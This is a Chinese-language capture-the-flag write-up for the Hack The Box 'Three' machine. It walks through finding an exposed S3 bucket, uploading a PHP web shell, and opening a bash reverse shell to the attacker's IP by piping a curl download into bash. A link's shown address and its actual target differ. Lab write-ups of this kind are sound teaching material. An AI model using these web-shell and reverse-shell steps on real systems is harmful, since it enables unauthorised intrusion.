---
title: HTB-Three
description: 'Hack the box'
pubDate: 2024-02-28 
image: /hackthebox/Three.png
categories:
  - Documentation
tags:
  - Hackthebox
  - Linux Machine
---

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709116186704-3029bfd2-db37-4bae-a68a-3eb8f9432181.png)根据邮件判断出域名为thetoppers.htb



![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709116687214-3d53a8d4-0460-419b-bc7b-f1307bd68451.png)

尝试使用dirsearch，没爆破出来

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709116718538-40d2c80a-a918-4509-8f88-c27bfb92e732.png)

使用gobuster扫描

扫描出s3子域（其实我没爆出来........）

什么是 Amazon S3

就是国内的对象存储，更粗暴的比喻，可以理解成一个云盘（只是一个有接口的云盘）。

下边是官方术语：



Amazon Simple Storage Service (Amazon S3) 是一种对象存储服务，提供行业领先的可扩展性、数据可用性、安全性和性能。各种规模和行业的客户可以为几乎任何使用案例存储和保护任意数量的数据，例如数据湖、云原生应用程序和移动应用程序。借助高成本效益的存储类和易于使用的管理功能，您可以优化成本、组织数据并配置精细调整过的访问控制，从而满足特定的业务、组织和合规性要求。

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709119706262-218f6e3c-9529-41c3-996b-1431eea7bcfc.png)

利用awscli连接

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709120978322-d44ea4a3-1662-4ca2-b637-59b164aa7fda.png)

先aws configure一下，这里我随便输入admin

```plain
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

```plain
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

```plain
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```plain
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

访问[http://thetoppers.htb/shell.php?cmd=ls](http://thetoppers.htb/shell.php?cmd=ls)可以看到thetoppers.htb桶里的目录及对象

images index.php shell.php

我们通过命令执行shell，curl执行bash脚本反弹shell来实现命令行交互。查看本机ip

ifconfig //10.10.16.20

```plain
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.20/1337 0>&1
```

nc监听端口

nc -nvlp 1337

python创建简易服务器

python3 -m http.server 8090

目标机curl本机bash文件并执行

[http://thetoppers.htb/shell.php?cmd=curl%2010.10.16.20:8090/bash.sh%20|%20bash](http://thetoppers.htb/shell.php?cmd=curl%2010.10.16.60:8090/shell.sh%20|%20bash)

进行反弹shell

也可以直接<font style="color:rgb(0, 0, 0);">浏览器输入以下命令获取flag</font>

<font style="color:rgb(0, 0, 0);">http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt（先ls../一下）</font>





